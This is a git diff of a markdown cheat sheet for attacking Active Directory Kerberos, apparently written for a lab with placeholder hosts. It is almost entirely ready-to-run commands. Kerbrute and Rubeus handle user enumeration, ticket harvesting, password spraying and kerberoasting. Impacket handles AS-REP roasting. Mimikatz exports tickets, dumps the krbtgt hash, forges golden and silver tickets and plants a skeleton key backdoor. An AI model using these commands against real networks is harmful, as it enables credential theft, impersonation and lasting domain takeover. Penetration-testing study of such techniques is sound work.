@@ -1,33 +1,41 @@
 # Attacking Kerberos 
 
 ## Enumeration w/ Kerbrute
-```
+```shell
 ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
 ```
 
 ## Harvesting Tickets w/ Rubeus
 This command tells Rubeus to harvest for TGTs every 30 seconds
-```
+```shell
 Rubeus.exe harvest /interval:30
 ```
 ## Password-Spraying w/ Rubeus
-```
+```shell
 Rubeus.exe brute /password:Password1 /noticket
 ```
 ## Kerberoasting w/ Rubeus & Impacket
-```
+```shell
 Rubeus.exe kerberoast
 ```
-```
+```shell
 cd /usr/share/doc/python3-impacket/examples/
 sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request
 ```
-## AS-REP Roasting w/ Rubeus
+## AS-REP Roasting w/ Rubeus & Impacket
+```shell
+# check ASREPRoast for all users in current domain
+.\Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>```
 ```
-Rubeus.exe asreproast
+```shell
+# check ASREPRoast for all domain users (credentials required)
+python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
+
+# check ASREPRoast for a list of users (no credentials required)
+python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
 ```
 ## Pass the Ticket w/ mimikatz
-```
+```shell
 mimikatz.exe
 privilege::debug           #Ensure this outputs [output '20' OK] (You need admin privileges)
 sekurlsa::tickets /export  #This will export all of the .kirbi tickets into the directory that you are currently in.
@@ -36,18 +44,18 @@ klist                      #Here were just verifying that we successfully impers
 ```
 ## Golden/Silver Ticket Attacks w/ mimikatz
 Dump the krbtgt hash
-```
+```shell
 mimikatz.exe
 privilege::debug
 lsadump::lsa /inject /name:krbtgt
 ```
 
 Create a Silver Ticket
-```
+```shell
 Kerberos::golden /user:Administrator /domain:controller.local /sid:<SID> /krbtgt:<NTLM hash> /id:1103
 ```
 Create a Golden Ticket
-```
+```shell
 Kerberos::golden /user:Administrator /domain:controller.local /sid:<SID> /krbtgt:<NTLM hash> /id:500
 ```
 `misc::cmd` - this will open a new elevated command prompt with the given ticket in mimikatz.
@@ -59,7 +67,7 @@ Kerberos::golden /user:Administrator /domain:controller.local /sid:<SID> /krbtgt
 `id` -> Put 500 to create golden tickets, change it to 1103 for silver tickets.
 
 ## Kerberos Backdoors w/ mimikatz (Skeleton Key)
-```
+```shell
 mimikatz.exe
 privilege::debug
 misc::skeleton
